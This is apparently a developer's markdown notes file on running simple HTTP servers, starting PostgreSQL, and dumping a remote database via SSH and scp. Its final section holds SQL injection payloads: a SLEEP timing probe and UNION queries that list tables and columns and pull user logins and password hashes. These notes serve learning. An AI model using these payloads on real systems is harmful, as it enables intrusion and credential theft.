# Servers

## SimpleHTTPServer (Python)

Run a simple http server in any directory on mac: `$ python -m SimpleHTTPServer [port number]`

Example: `$ python -m SimpleHTTPServer 8005`

## Simple HTTP Server (ruby)

1. Run a simple http server in any directory on mac: `$ ruby hello_world_server.rb` [see file](./hello_world_server.rb)

2. Run a more complex http server. For each incoming request, we’ll parse the *Request-URI* header and translate it into a path to a file within the server’s public folder:

```ruby
ext = File.extname(path).split(".").last
```

If we’re able to find a match, we’ll respond with its contents, using the file’s size to determine the *Content-Length* and its extension to determine the *Content-Type*:

```ruby
"HTTP/1.1 200 OK\r\n" +
"Content-Type: #{content_type(file)}\r\n" +
"Content-Length: #{file.size}\r\n" +
"Connection: close\r\n"
```

If no matching file can be found, we’ll respond with a 404 Not Found error status.

## PostgreSQL Server

*PG::ConnectionBad*
```Unix
Started GET "/" for 127.0.0.1 at 2017-06-28 10:31:13 -0500
could not connect to server: No such file or directory
	Is the server running locally and accepting
	connections on Unix domain socket "/tmp/.s.PGSQL.5432"?
 excluded from capture: DSN not set

PG::ConnectionBad (could not connect to server: No such file or directory
	Is the server running locally and accepting
	connections on Unix domain socket "/tmp/.s.PGSQL.5432"?
):
```

Starting the server: `pg_ctl` - [utility to initialize, start, stop, or control a PostgreSQL server](https://www.postgresql.org/docs/9.5/static/app-pg-ctl.html).

Example: `$ pg_ctl start [-D datadir] [-l filename]`
* get path to postgres via `$ which postgres` => `/usr/local/var/postgres`
* `-D datadir`: Specifies the file system location of the database files.
* `-l filename`: Append the server log output to filename.
If you don't specify this, logs will be outputted to the console.

```Unix
$ pg_ctl -D /usr/local/var/postgres -l logfile start
```

## Deamons

Files with `d` or `.d` suffix stand for Deamon.
Example: `/etc/init.d/nginx`

## Downloading Remote Serve SQL

1. SSH into the remote server: `$ ssh mike@11.111.11.11`

2. Copy the application's database host, name, username, and password via vi or cat:

`$ cat /var/www/path/to/application/shared/config/database.yml`

*Example:*
```yml
production:
  host: database_host
  adapter: postgresql
  encoding: unicode
  database: database_name
  pool: 5
  username: database_username
  password: database_password
```

3. After you have set the variables, `pg_dump` the database. When prompted, paste the database password:

```Unix
$ pg_dump -c -f file_name.sql -d database_name -h database_location -U database_username -W
database_password
```

4. `tar` the `.sql` file and delete (`rm`) it:

```Unix
$ tar czvf file_name.sql.tgz [file_name].sql
$ rm file_name.sql
```

Why are the flags `c`, `z`, `v`, `f`?

* `-c`: Create a new archive containing the specified items.
* `-z`: Compress the resulting archive (i.e., (un)z̲ip).
* `-v`: Produce verbose output.
* `-f`: Read the archive from or write the archive to the specified file.

Print your current working directory so you know how to access the file when you complete a secure copy (scp):

`$ pwd`

In many cases, this will be: `/home/mike/`

5. Exit the remove database and copy the sql tgz file to your local machine:

`$ scp mike@app_url:path_to_file/file_name.sql.tgz .`

Example: `$ scp mike@11.111.11.11:/home/mike/file_name.sql.tgz .`

6. Unzip, extract, and print file names (i.e., verbosely) via: `$ tar xzvf file_name.sql.tgz`

Why `z`, `x`, `v`, `f`?

* `-x`: means ex̲tract files from the archive.
* `-z`: Compress the resulting archive (i.e., (un)z̲ip).
* `-v`: Produce verbose output.
* `-f`: Read the archive from or write the archive to the specified file.

7. Load the sql file into your local database:

`$ psql -d name_of_local_database < path_to_file.sql`

_You may need to update the database due to any outstanding migrations if you have any locally:_

```Unix
$ bundle exec rake db:migrate
```

## SQL Injection

[Running an SQL Injection Attack - Computerphile](https://youtu.be/ciNHn38EyRc)

```SQL
-- SLEEP is an SQL command
SELECT ? FROM ? WHERE ? LIKE %hammer% AND 0 = SLEEP(2);

-- UNION Appends - makes sure column count matches

-- Get the table names of all the tables
-- we are selecting 3 columns b/c it must match the original SELECT call
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.table); --%';

-- Get the column names of the users table
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); --%';

-- GEt the particular data for each user
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT uLogin, uHash, uType FROM users); --%''
```

![alt text](/assets/sql_injected_products_table.png "SQL_Injected_Products_Table")
